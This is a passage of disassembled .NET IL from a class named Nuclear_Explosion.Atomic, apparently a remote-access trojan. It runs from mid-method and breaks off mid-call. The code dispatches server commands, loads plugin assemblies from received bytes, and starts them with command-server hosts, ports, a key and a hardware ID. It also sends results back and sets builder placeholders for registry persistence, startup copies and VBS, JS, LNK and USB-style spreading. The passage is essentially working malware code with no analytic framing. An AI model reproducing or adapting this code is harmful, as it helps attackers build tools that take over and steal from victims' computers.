    IL_020a:  newarr     [mscorlib]System.String
    IL_020f:  dup
    IL_0210:  ldc.i4.0
    IL_0211:  ldstr      "GPL"
    IL_0216:  stelem.ref
    IL_0217:  dup
    IL_0218:  ldc.i4.1
    IL_0219:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_021e:  stelem.ref
    IL_021f:  dup
    IL_0220:  ldc.i4.2
    IL_0221:  ldloc.0
    IL_0222:  ldc.i4.5
    IL_0223:  ldelem.ref
    IL_0224:  stelem.ref
    IL_0225:  dup
    IL_0226:  ldc.i4.3
    IL_0227:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_022c:  stelem.ref
    IL_022d:  dup
    IL_022e:  ldc.i4.4
    IL_022f:  ldloc.0
    IL_0230:  ldc.i4.1
    IL_0231:  ldelem.ref
    IL_0232:  stelem.ref
    IL_0233:  dup
    IL_0234:  ldc.i4.5
    IL_0235:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_023a:  stelem.ref
    IL_023b:  dup
    IL_023c:  ldc.i4.6
    IL_023d:  ldc.i4.0
    IL_023e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(bool)
    IL_0243:  stelem.ref
    IL_0244:  call       string [mscorlib]System.String::Concat(string[])
    IL_0249:  call       instance void Nuclear_Explosion.Atomic::Send(string)
    IL_024e:  nop
    IL_024f:  nop
    IL_0250:  nop
    IL_0251:  br         IL_072b

    IL_0256:  ldloc.0
    IL_0257:  ldc.i4.0
    IL_0258:  ldelem.ref
    IL_0259:  ldstr      "LP"
    IL_025e:  ldc.i4.0
    IL_025f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_0264:  ldc.i4.0
    IL_0265:  ceq
    IL_0267:  stloc.s    V_5
    IL_0269:  ldloc.s    V_5
    IL_026b:  brfalse.s  IL_02e9

    IL_026d:  ldarg.0
    IL_026e:  ldarg.0
    IL_026f:  ldfld      string[] Nuclear_Explosion.Atomic::Hosts
    IL_0274:  ldarg.0
    IL_0275:  ldfld      int32 Nuclear_Explosion.Atomic::H
    IL_027a:  ldelem.ref
    IL_027b:  ldarg.0
    IL_027c:  ldfld      string[] Nuclear_Explosion.Atomic::Ports
    IL_0281:  ldarg.0
    IL_0282:  ldfld      int32 Nuclear_Explosion.Atomic::P
    IL_0287:  ldelem.ref
    IL_0288:  ldloc.0
    IL_0289:  ldc.i4.1
    IL_028a:  ldelem.ref
    IL_028b:  ldloc.0
    IL_028c:  ldc.i4.2
    IL_028d:  ldelem.ref
    IL_028e:  ldarg.0
    IL_028f:  ldarg.0
    IL_0290:  ldarg.0
    IL_0291:  ldfld      string Nuclear_Explosion.Atomic::ID
    IL_0296:  call       instance object Nuclear_Explosion.Atomic::Decode(string)
    IL_029b:  ldstr      "_"
    IL_02a0:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_02a5:  ldarg.0
    IL_02a6:  call       instance string Nuclear_Explosion.Atomic::HWD()
    IL_02ab:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                           object)
    IL_02b0:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_02b5:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
    IL_02ba:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
    IL_02bf:  ldloc.0
    IL_02c0:  ldc.i4.3
    IL_02c1:  ldelem.ref
    IL_02c2:  ldloc.0
    IL_02c3:  ldc.i4.4
    IL_02c4:  ldelem.ref
    IL_02c5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
    IL_02ca:  ldloc.0
    IL_02cb:  ldc.i4.5
    IL_02cc:  ldelem.ref
    IL_02cd:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_02d2:  ldloc.0
    IL_02d3:  ldc.i4.6
    IL_02d4:  ldelem.ref
    IL_02d5:  ldloc.0
    IL_02d6:  ldc.i4.7
    IL_02d7:  ldelem.ref
    IL_02d8:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(string)
    IL_02dd:  call       instance object Nuclear_Explosion.Atomic::INV(string,
                                                                       string,
                                                                       string,
                                                                       string,
                                                                       string,
                                                                       string,
                                                                       int32,
                                                                       bool,
                                                                       string,
                                                                       bool)
    IL_02e2:  pop
    IL_02e3:  nop
    IL_02e4:  br         IL_072b

    IL_02e9:  ldloc.0
    IL_02ea:  ldc.i4.0
    IL_02eb:  ldelem.ref
    IL_02ec:  ldstr      "UNV"
    IL_02f1:  ldc.i4.0
    IL_02f2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                      string,
                                                                                                                      bool)
    IL_02f7:  ldc.i4.0
    IL_02f8:  ceq
    IL_02fa:  stloc.s    V_6
    IL_02fc:  ldloc.s    V_6
    IL_02fe:  brfalse    IL_072b

    IL_0303:  ldarg.0
    IL_0304:  ldloc.0
    IL_0305:  ldc.i4.1
    IL_0306:  ldelem.ref
    IL_0307:  call       instance object Nuclear_Explosion.Atomic::LA(string)
    IL_030c:  ldnull
    IL_030d:  ldstr      "CreateInstance"
    IL_0312:  ldc.i4.1
    IL_0313:  newarr     [mscorlib]System.Object
    IL_0318:  dup
    IL_0319:  ldc.i4.0
    IL_031a:  ldloc.0
    IL_031b:  ldc.i4.2
    IL_031c:  ldelema    [mscorlib]System.String
    IL_0321:  dup
    IL_0322:  stloc.s    V_20
    IL_0324:  ldind.ref
    IL_0325:  stelem.ref
    IL_0326:  dup
    IL_0327:  stloc.s    V_21
    IL_0329:  ldnull
    IL_032a:  ldnull
    IL_032b:  ldc.i4.1
    IL_032c:  newarr     [mscorlib]System.Boolean
    IL_0331:  dup
    IL_0332:  ldc.i4.0
    IL_0333:  ldc.i4.1
    IL_0334:  stelem.i1
    IL_0335:  dup
    IL_0336:  stloc.s    V_22
    IL_0338:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_033d:  stloc.s    V_23
    IL_033f:  ldloc.s    V_22
    IL_0341:  ldc.i4.0
    IL_0342:  ldelem.u1
    IL_0343:  brtrue.s   IL_0347

    IL_0345:  br.s       IL_0367

    IL_0347:  ldloc.s    V_20
    IL_0349:  ldloc.s    V_21
    IL_034b:  ldc.i4.0
    IL_034c:  ldelem.ref
    IL_034d:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0352:  ldtoken    [mscorlib]System.String
    IL_0357:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_035c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0361:  castclass  [mscorlib]System.String
    IL_0366:  stind.ref
    IL_0367:  ldloc.s    V_23
    IL_0369:  ldnull
    IL_036a:  ldstr      "UNI"
    IL_036f:  ldc.i4.s   43
    IL_0371:  newarr     [mscorlib]System.Object
    IL_0376:  dup
    IL_0377:  ldc.i4.0
    IL_0378:  ldarg.0
    IL_0379:  ldarg.0
    IL_037a:  ldfld      string Nuclear_Explosion.Atomic::MUTEX
    IL_037f:  call       instance object Nuclear_Explosion.Atomic::Encode(string)
    IL_0384:  stelem.ref
    IL_0385:  dup
    IL_0386:  ldc.i4.1
    IL_0387:  ldloc.0
    IL_0388:  ldc.i4.3
    IL_0389:  ldelema    [mscorlib]System.String
    IL_038e:  dup
    IL_038f:  stloc.s    V_7
    IL_0391:  ldind.ref
    IL_0392:  stelem.ref
    IL_0393:  dup
    IL_0394:  ldc.i4.2
    IL_0395:  ldstr      "%DPM%"
    IL_039a:  stelem.ref
    IL_039b:  dup
    IL_039c:  ldc.i4.3
    IL_039d:  ldstr      "%DFN%"
    IL_03a2:  stelem.ref
    IL_03a3:  dup
    IL_03a4:  ldc.i4.4
    IL_03a5:  ldstr      "%DN%"
    IL_03aa:  stelem.ref
    IL_03ab:  dup
    IL_03ac:  ldc.i4.5
    IL_03ad:  ldstr      "%REGENBLED%"
    IL_03b2:  stelem.ref
    IL_03b3:  dup
    IL_03b4:  ldc.i4.6
    IL_03b5:  ldstr      "%RGP%"
    IL_03ba:  stelem.ref
    IL_03bb:  dup
    IL_03bc:  ldc.i4.7
    IL_03bd:  ldstr      "%REGV%"
    IL_03c2:  stelem.ref
    IL_03c3:  dup
    IL_03c4:  ldc.i4.8
    IL_03c5:  ldstr      "%SENB%"
    IL_03ca:  stelem.ref
    IL_03cb:  dup
    IL_03cc:  ldc.i4.s   9
    IL_03ce:  ldstr      "%TNINL%"
    IL_03d3:  stelem.ref
    IL_03d4:  dup
    IL_03d5:  ldc.i4.s   10
    IL_03d7:  ldstr      "%COMPLEX%"
    IL_03dc:  stelem.ref
    IL_03dd:  dup
    IL_03de:  ldc.i4.s   11
    IL_03e0:  ldstr      "%CLNITS%"
    IL_03e5:  stelem.ref
    IL_03e6:  dup
    IL_03e7:  ldc.i4.s   12
    IL_03e9:  ldstr      "%MoveFolderName%"
    IL_03ee:  stelem.ref
    IL_03ef:  dup
    IL_03f0:  ldc.i4.s   13
    IL_03f2:  ldstr      "%DesktopShortcuts%"
    IL_03f7:  stelem.ref
    IL_03f8:  dup
    IL_03f9:  ldc.i4.s   14
    IL_03fb:  ldstr      "%QuickLaunch%"
    IL_0400:  stelem.ref
    IL_0401:  dup
    IL_0402:  ldc.i4.s   15
    IL_0404:  ldstr      "%STFENB%"
    IL_0409:  stelem.ref
    IL_040a:  dup
    IL_040b:  ldc.i4.s   16
    IL_040d:  ldstr      "%STF%.EXE"
    IL_0412:  stelem.ref
    IL_0413:  dup
    IL_0414:  ldc.i4.s   17
    IL_0416:  ldstr      "%VBSENBALED%"
    IL_041b:  stelem.ref
    IL_041c:  dup
    IL_041d:  ldc.i4.s   18
    IL_041f:  ldstr      "%V%"
    IL_0424:  stelem.ref
    IL_0425:  dup
    IL_0426:  ldc.i4.s   19
    IL_0428:  ldstr      "%JSENB%"
    IL_042d:  stelem.ref
    IL_042e:  dup
    IL_042f:  ldc.i4.s   20
    IL_0431:  ldstr      "%J%"
    IL_0436:  stelem.ref
    IL_0437:  dup
    IL_0438:  ldc.i4.s   21
    IL_043a:  ldstr      "%LNKENABLED%"
    IL_043f:  stelem.ref
    IL_0440:  dup
    IL_0441:  ldc.i4.s   22
    IL_0443:  ldstr      "%SCN%"
    IL_0448:  stelem.ref
    IL_0449:  dup
    IL_044a:  ldc.i4.s   23
    IL_044c:  ldstr      "%URLENABLED%"
    IL_0451:  stelem.ref
    IL_0452:  dup
    IL_0453:  ldc.i4.s   24
    IL_0455:  ldstr      "%SCNU%"
    IL_045a:  stelem.ref
    IL_045b:  dup
    IL_045c:  ldc.i4.s   25
    IL_045e:  ldstr      "%CODEDOMENABLED%"
    IL_0463:  stelem.ref
    IL_0464:  dup
    IL_0465:  ldc.i4.s   26
    IL_0467:  ldstr      "%CodeDom%.EXE"
    IL_046c:  stelem.ref
    IL_046d:  dup
    IL_046e:  ldc.i4.s   32
    IL_0470:  ldloc.0
    IL_0471:  ldc.i4.4
    IL_0472:  ldelema    [mscorlib]System.String
    IL_0477:  dup
    IL_0478:  stloc.s    V_8
    IL_047a:  ldind.ref
    IL_047b:  stelem.ref
    IL_047c:  dup
    IL_047d:  ldc.i4.s   33
    IL_047f:  ldloc.0
    IL_0480:  ldc.i4.5
    IL_0481:  ldelema    [mscorlib]System.String
    IL_0486:  dup
    IL_0487:  stloc.s    V_9
    IL_0489:  ldind.ref
    IL_048a:  stelem.ref
    IL_048b:  dup
    IL_048c:  ldc.i4.s   34
    IL_048e:  ldsfld     string Nuclear_Explosion.Atomic::App
    IL_0493:  stelem.ref
    IL_0494:  dup
    IL_0495:  ldc.i4.s   35
    IL_0497:  ldloc.0
    IL_0498:  ldc.i4.6
    IL_0499:  ldelema    [mscorlib]System.String
    IL_049e:  dup
    IL_049f:  stloc.s    V_10
    IL_04a1:  ldind.ref
    IL_04a2:  stelem.ref
    IL_04a3:  dup
    IL_04a4:  ldc.i4.s   36
    IL_04a6:  ldloc.0
    IL_04a7:  ldc.i4.7
    IL_04a8:  ldelema    [mscorlib]System.String
    IL_04ad:  dup
    IL_04ae:  stloc.s    V_11
    IL_04b0:  ldind.ref
    IL_04b1:  stelem.ref
    IL_04b2:  dup
    IL_04b3:  ldc.i4.s   37
    IL_04b5:  ldloc.0
    IL_04b6:  ldc.i4.8
    IL_04b7:  ldelema    [mscorlib]System.String
    IL_04bc:  dup
    IL_04bd:  stloc.s    V_12
    IL_04bf:  ldind.ref
    IL_04c0:  stelem.ref
    IL_04c1:  dup
    IL_04c2:  ldc.i4.s   38
    IL_04c4:  ldloc.0
    IL_04c5:  ldc.i4.s   9
    IL_04c7:  ldelema    [mscorlib]System.String
    IL_04cc:  dup
    IL_04cd:  stloc.s    V_13
    IL_04cf:  ldind.ref
    IL_04d0:  stelem.ref
    IL_04d1:  dup
    IL_04d2:  ldc.i4.s   39
    IL_04d4:  ldloc.0
    IL_04d5:  ldc.i4.s   10
    IL_04d7:  ldelema    [mscorlib]System.String
    IL_04dc:  dup
    IL_04dd:  stloc.s    V_14
    IL_04df:  ldind.ref
    IL_04e0:  stelem.ref
    IL_04e1:  dup
    IL_04e2:  ldc.i4.s   40
    IL_04e4:  ldloc.0
    IL_04e5:  ldc.i4.s   11
    IL_04e7:  ldelema    [mscorlib]System.String
    IL_04ec:  dup
    IL_04ed:  stloc.s    V_15
    IL_04ef:  ldind.ref
    IL_04f0:  stelem.ref
    IL_04f1:  dup
    IL_04f2:  ldc.i4.s   41
    IL_04f4:  ldloc.0
    IL_04f5:  ldc.i4.s   12
    IL_04f7:  ldelema    [mscorlib]System.String
    IL_04fc:  dup
    IL_04fd:  stloc.s    V_16
    IL_04ff:  ldind.ref
    IL_0500:  stelem.ref
    IL_0501:  dup
    IL_0502:  ldc.i4.s   42
    IL_0504:  ldloc.0
    IL_0505:  ldc.i4.s   13
    IL_0507:  ldelema    [mscorlib]System.String
    IL_050c:  dup
    IL_050d:  stloc.s    V_17
    IL_050f:  ldind.ref
    IL_0510:  stelem.ref
    IL_0511:  dup
    IL_0512:  stloc.s    V_18
    IL_0514:  ldnull
    IL_0515:  ldnull
    IL_0516:  ldc.i4.s   43
    IL_0518:  newarr     [mscorlib]System.Boolean
    IL_051d:  dup
    IL_051e:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=43' '<PrivateImplementationDetails>'::'5B1EE7CAD3DFF220A95D1D6B91435D9E1520AC41'
    IL_0523:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0528:  dup
    IL_0529:  stloc.s    V_19
    IL_052b:  ldc.i4.1
    IL_052c:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
                                                                                                                       class [mscorlib]System.Type[],
                                                                                                                       bool[],
                                                                                                                       bool)
    IL_0531:  pop
    IL_0532:  ldloc.s    V_19
    IL_0534:  ldc.i4.1
    IL_0535:  ldelem.u1
    IL_0536:  brtrue.s   IL_053a

    IL_0538:  br.s       IL_055a

    IL_053a:  ldloc.s    V_7
    IL_053c:  ldloc.s    V_18
    IL_053e:  ldc.i4.1
    IL_053f:  ldelem.ref
    IL_0540:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0545:  ldtoken    [mscorlib]System.String
    IL_054a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_054f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0554:  castclass  [mscorlib]System.String
    IL_0559:  stind.ref
    IL_055a:  ldloc.s    V_19
    IL_055c:  ldc.i4.s   32
    IL_055e:  ldelem.u1
    IL_055f:  brtrue.s   IL_0563

    IL_0561:  br.s       IL_0584

    IL_0563:  ldloc.s    V_8
    IL_0565:  ldloc.s    V_18
    IL_0567:  ldc.i4.s   32
    IL_0569:  ldelem.ref
    IL_056a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_056f:  ldtoken    [mscorlib]System.String
    IL_0574:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0579:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_057e:  castclass  [mscorlib]System.String
    IL_0583:  stind.ref
    IL_0584:  ldloc.s    V_19
    IL_0586:  ldc.i4.s   33
    IL_0588:  ldelem.u1
    IL_0589:  brtrue.s   IL_058d

    IL_058b:  br.s       IL_05ae

    IL_058d:  ldloc.s    V_9
    IL_058f:  ldloc.s    V_18
    IL_0591:  ldc.i4.s   33
    IL_0593:  ldelem.ref
    IL_0594:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0599:  ldtoken    [mscorlib]System.String
    IL_059e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_05a3:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_05a8:  castclass  [mscorlib]System.String
    IL_05ad:  stind.ref
    IL_05ae:  ldloc.s    V_19
    IL_05b0:  ldc.i4.s   34
    IL_05b2:  ldelem.u1
    IL_05b3:  brtrue.s   IL_05b7

    IL_05b5:  br.s       IL_05da

    IL_05b7:  ldloc.s    V_18
    IL_05b9:  ldc.i4.s   34
    IL_05bb:  ldelem.ref
    IL_05bc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_05c1:  ldtoken    [mscorlib]System.String
    IL_05c6:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_05cb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_05d0:  castclass  [mscorlib]System.String
    IL_05d5:  stsfld     string Nuclear_Explosion.Atomic::App
    IL_05da:  ldloc.s    V_19
    IL_05dc:  ldc.i4.s   35
    IL_05de:  ldelem.u1
    IL_05df:  brtrue.s   IL_05e3

    IL_05e1:  br.s       IL_0604

    IL_05e3:  ldloc.s    V_10
    IL_05e5:  ldloc.s    V_18
    IL_05e7:  ldc.i4.s   35
    IL_05e9:  ldelem.ref
    IL_05ea:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_05ef:  ldtoken    [mscorlib]System.String
    IL_05f4:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_05f9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_05fe:  castclass  [mscorlib]System.String
    IL_0603:  stind.ref
    IL_0604:  ldloc.s    V_19
    IL_0606:  ldc.i4.s   36
    IL_0608:  ldelem.u1
    IL_0609:  brtrue.s   IL_060d

    IL_060b:  br.s       IL_062e

    IL_060d:  ldloc.s    V_11
    IL_060f:  ldloc.s    V_18
    IL_0611:  ldc.i4.s   36
    IL_0613:  ldelem.ref
    IL_0614:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0619:  ldtoken    [mscorlib]System.String
    IL_061e:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0623:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0628:  castclass  [mscorlib]System.String
    IL_062d:  stind.ref
    IL_062e:  ldloc.s    V_19
    IL_0630:  ldc.i4.s   37
    IL_0632:  ldelem.u1
    IL_0633:  brtrue.s   IL_0637

    IL_0635:  br.s       IL_0658

    IL_0637:  ldloc.s    V_12
    IL_0639:  ldloc.s    V_18
    IL_063b:  ldc.i4.s   37
    IL_063d:  ldelem.ref
    IL_063e:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0643:  ldtoken    [mscorlib]System.String
    IL_0648:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_064d:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0652:  castclass  [mscorlib]System.String
    IL_0657:  stind.ref
    IL_0658:  ldloc.s    V_19
    IL_065a:  ldc.i4.s   38
    IL_065c:  ldelem.u1
    IL_065d:  brtrue.s   IL_0661

    IL_065f:  br.s       IL_0682

    IL_0661:  ldloc.s    V_13
    IL_0663:  ldloc.s    V_18
    IL_0665:  ldc.i4.s   38
    IL_0667:  ldelem.ref
    IL_0668:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_066d:  ldtoken    [mscorlib]System.String
    IL_0672:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_0677:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_067c:  castclass  [mscorlib]System.String
    IL_0681:  stind.ref
    IL_0682:  ldloc.s    V_19
    IL_0684:  ldc.i4.s   39
    IL_0686:  ldelem.u1
    IL_0687:  brtrue.s   IL_068b

    IL_0689:  br.s       IL_06ac

    IL_068b:  ldloc.s    V_14
    IL_068d:  ldloc.s    V_18
    IL_068f:  ldc.i4.s   39
    IL_0691:  ldelem.ref
    IL_0692:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0697:  ldtoken    [mscorlib]System.String
    IL_069c:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_06a1:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_06a6:  castclass  [mscorlib]System.String
    IL_06ab:  stind.ref
    IL_06ac:  ldloc.s    V_19
    IL_06ae:  ldc.i4.s   40
    IL_06b0:  ldelem.u1
    IL_06b1:  brtrue.s   IL_06b5

    IL_06b3:  br.s       IL_06d6

    IL_06b5:  ldloc.s    V_15
    IL_06b7:  ldloc.s    V_18
    IL_06b9:  ldc.i4.s   40
    IL_06bb:  ldelem.ref
    IL_06bc:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_06c1:  ldtoken    [mscorlib]System.String
    IL_06c6:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_06cb:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_06d0:  castclass  [mscorlib]System.String
    IL_06d5:  stind.ref
    IL_06d6:  ldloc.s    V_19
    IL_06d8:  ldc.i4.s   41
    IL_06da:  ldelem.u1
    IL_06db:  brtrue.s   IL_06df

    IL_06dd:  br.s       IL_0700

    IL_06df:  ldloc.s    V_16
    IL_06e1:  ldloc.s    V_18
    IL_06e3:  ldc.i4.s   41
    IL_06e5:  ldelem.ref
    IL_06e6:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_06eb:  ldtoken    [mscorlib]System.String
    IL_06f0:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_06f5:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_06fa:  castclass  [mscorlib]System.String
    IL_06ff:  stind.ref
    IL_0700:  ldloc.s    V_19
    IL_0702:  ldc.i4.s   42
    IL_0704:  ldelem.u1
    IL_0705:  brtrue.s   IL_0709

    IL_0707:  br.s       IL_072a

    IL_0709:  ldloc.s    V_17
    IL_070b:  ldloc.s    V_18
    IL_070d:  ldc.i4.s   42
    IL_070f:  ldelem.ref
    IL_0710:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
    IL_0715:  ldtoken    [mscorlib]System.String
    IL_071a:  call       class [mscorlib]System.Type [mscorlib]System.Type::GetTypeFromHandle(valuetype [mscorlib]System.RuntimeTypeHandle)
    IL_071f:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ChangeType(object,
                                                                                                                      class [mscorlib]System.Type)
    IL_0724:  castclass  [mscorlib]System.String
    IL_0729:  stind.ref
    IL_072a:  nop
    IL_072b:  ret
  } // end of method Atomic::data

  .method public instance object  INV(string H,
                                      string P,
                                      string N,
                                      string C,
                                      string ID,
                                      string Bytes,
                                      int32 S,
                                      bool M,
                                      string MD5,
                                      bool B) cil managed
  {
    // Code size       582 (0x246)
    .maxstack  9
    .locals init (object V_0,
             object[] V_1,
             bool[] V_2,
             bool V_3,
             bool V_4,
             bool V_5)
    IL_0000:  nop
    IL_0001:  ldarg.0
    IL_0002:  ldarg.s    Bytes
    IL_0004:  call       instance object Nuclear_Explosion.Atomic::LA(string)
    IL_0009:  ldnull
    IL_000a:  ldstr      "CreateInstance"
    IL_000f:  ldc.i4.2
    IL_0010:  newarr     [mscorlib]System.Object
    IL_0015:  dup
    IL_0016:  ldc.i4.0
    IL_0017:  ldarg.3
    IL_0018:  ldstr      "."
    IL_001d:  ldarg.s    C
    IL_001f:  call       string [mscorlib]System.String::Concat(string,
                                                                string,
                                                                string)
    IL_0024:  stelem.ref
    IL_0025:  dup
    IL_0026:  ldc.i4.1
    IL_0027:  ldc.i4.1
    IL_0028:  box        [mscorlib]System.Boolean
    IL_002d:  stelem.ref
    IL_002e:  ldnull
    IL_002f:  ldnull
    IL_0030:  ldnull
    IL_0031:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[],
                                                                                                                      bool[])
    IL_0036:  ldnull
    IL_0037:  ldstr      "Start"
    IL_003c:  ldc.i4.6
    IL_003d:  newarr     [mscorlib]System.Object
    IL_0042:  dup
    IL_0043:  ldc.i4.0
    IL_0044:  ldarg.s    ID
    IL_0046:  stelem.ref
    IL_0047:  dup
    IL_0048:  ldc.i4.1
    IL_0049:  ldarg.s    S
    IL_004b:  box        [mscorlib]System.Int32
    IL_0050:  stelem.ref
    IL_0051:  dup
    IL_0052:  ldc.i4.2
    IL_0053:  ldarg.1
    IL_0054:  stelem.ref
    IL_0055:  dup
    IL_0056:  ldc.i4.3
    IL_0057:  ldarg.2
    IL_0058:  stelem.ref
    IL_0059:  dup
    IL_005a:  ldc.i4.4
    IL_005b:  ldsfld     string Nuclear_Explosion.Atomic::Key
    IL_0060:  stelem.ref
    IL_0061:  dup
    IL_0062:  ldc.i4.5
    IL_0063:  ldsfld     string Nuclear_Explosion.Atomic::SPL
    IL_0068:  stelem.ref
    IL_0069:  dup
    IL_006a:  stloc.1
    IL_006b:  ldnull
    IL_006c:  ldnull
    IL_006d:  ldc.i4.6
    IL_006e:  newarr     [mscorlib]System.Boolean
    IL_0073:  dup
    IL_0074:  ldtoken    field valuetype '<PrivateImplementationDetails>'/'__StaticArrayInitTypeSize=6' '<PrivateImplementationDetails>'::'03C7F4E8FB359AEC0EEF0814B66A704FC43FB3A8'
    IL_0079:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_007e:  dup
    IL_007f:  stloc.2
    IL_0080:  ldc.i4.1
    IL_0081:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                       class [mscorlib]System.Type,
                                                                                                                       string,
                                                                                                                       object[],
                                                                                                                       string[],
